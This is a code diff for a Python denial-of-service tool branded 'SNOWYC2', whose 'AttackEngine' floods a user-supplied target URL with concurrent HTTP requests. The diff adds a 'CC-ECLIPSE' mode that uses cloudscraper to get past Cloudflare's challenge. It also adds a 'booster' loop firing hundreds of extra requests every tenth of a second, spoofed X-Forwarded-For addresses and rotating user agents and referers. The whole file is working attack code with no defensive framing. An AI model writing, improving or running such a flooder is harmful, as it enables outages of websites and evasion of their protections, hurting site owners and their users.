@@ -4,9 +4,10 @@ import random
 import sys
 import os
 import psutil
-import aiohttp
+import cloudscraper
+import httpx
 
-# File loaders
+# Load file data
 def load_lines(filename):
     try:
         with open(filename, "r") as f:
@@ -17,11 +18,12 @@ def load_lines(filename):
 REFERERS = load_lines("refs.txt")
 USER_AGENTS = load_lines("uas.txt")
 
-MAX_CONCURRENT = 10000  # Power mode
+MAX_CONCURRENT = 2500
 REQUEST_TIMEOUT = 10
 
 class AttackEngine:
-    def __init__(self, target, duration):
+    def __init__(self, method, target, duration):
+        self.method = method
         self.target = target
         self.duration = duration
         self.start_time = time.time()
@@ -44,29 +46,55 @@ class AttackEngine:
         self.stats['rps'] = rps
         self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)
 
-    async def make_request(self, session):
+    async def make_request(self, client):
         headers = {
+            **self.session_headers,
             "User-Agent": random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0",
             "Referer": random.choice(REFERERS) if REFERERS else "https://google.com",
-            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
+            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1"
         }
         try:
-            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
-                if response.status == 200:
-                    return "SUCCESS"
-                elif str(response.status).startswith("4"):
-                    return "ERROR"
-                return "OTHER"
+            r = await client.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT)
+            return "SUCCESS" if r.status_code == 200 else "ERROR"
         except:
             return "ERROR"
 
-    async def run_attack(self):
-        connector = aiohttp.TCPConnector(limit=None, ssl=False)
-        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+    async def booster(self):
+        async with httpx.AsyncClient(http2=True, verify=False, timeout=REQUEST_TIMEOUT) as client:
             while time.time() - self.start_time < self.duration:
-                tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
-                results = await asyncio.gather(*tasks, return_exceptions=True)
+                for _ in range(300):  # Booster firepower
+                    asyncio.create_task(self.make_request(client))
+                await asyncio.sleep(0.1)
+
+    def solve_challenge(self):
+        print("\n[CC-ECLIPSE] Solving Cloudflare challenge...")
+        scraper = cloudscraper.create_scraper()
+        try:
+            res = scraper.get(self.target, timeout=REQUEST_TIMEOUT)
+            if res.status_code == 200:
+                print("[+] Cloudflare bypassed successfully!")
+                self.session_headers = dict(scraper.headers)
+            else:
+                print(f"[!] Challenge failed with status: {res.status_code}")
+        except Exception as e:
+            print(f"[!] Challenge solve error: {e}")
+            sys.exit(1)
+
+    async def run_attack(self):
+        if self.method == "CC-ECLIPSE":
+            self.solve_challenge()
+
+        async with httpx.AsyncClient(http2=True, verify=False, timeout=REQUEST_TIMEOUT) as client:
+            asyncio.create_task(self.booster())
+
+            while time.time() - self.start_time < self.duration:
+                tasks = [self.make_request(client) for _ in range(MAX_CONCURRENT)]
+                results = await asyncio.gather(*tasks)
                 self.update_stats(results)
                 self.print_status()
                 await asyncio.sleep(0.5)
@@ -81,7 +109,7 @@ class AttackEngine:
 
         print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
         print("=" * 60)
-        print(f"METHOD: C-ECLIPSE | TARGET: {self.target} | TIME: {self.duration}s")
+        print(f"METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
         print("=" * 60)
         print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
         print(f"RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
@@ -101,11 +129,11 @@ class AttackEngine:
         print(f"AVERAGE RPS: {avg_rps:.1f}")
         print("=" * 60)
 
-# Main
 def main():
     print("\nSNOWYC2 - T.ME/STSVKINGDOM")
     print("=" * 60)
 
+    method = input("METHOD (C-ECLIPSE / CC-ECLIPSE): ").strip().upper()
     target = input("TARGET: ").strip()
     if not target.startswith("http"):
         target = "http://" + target
@@ -115,7 +143,7 @@ def main():
         print("Invalid time input.")
         return
 
-    engine = AttackEngine(target, duration)
+    engine = AttackEngine(method, target, duration)
     try:
         asyncio.run(engine.run_attack())
     except KeyboardInterrupt:
